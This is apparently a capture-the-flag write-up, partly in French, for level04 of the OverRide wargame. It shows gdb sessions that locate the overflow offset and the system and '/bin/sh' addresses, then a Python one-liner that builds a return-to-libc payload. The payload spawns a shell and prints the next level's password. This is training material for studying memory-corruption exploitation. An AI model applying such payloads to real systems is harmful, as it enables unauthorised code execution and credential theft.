This time, we will use a return-to-libc attack.

To do this, we will overflow gets, which, as we know, is not protected. The only drawback is that it is in a fork. Therefore, we will add tracking of the fork processes.

```
level04@OverRide:~$ gdb level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level04/level04 
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag 

^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) set follow-fork-mode child
(gdb) r

Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1749]
0x41326641 in ?? ()
```

en le mettant dans wiremask on retrouve un offset de 156

a cela on va chercher les 3 pointer qui vont nous interesser :

system :

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>


/bin/sh:
(gdb) find &system, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

e

python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/payload

```
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass	
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```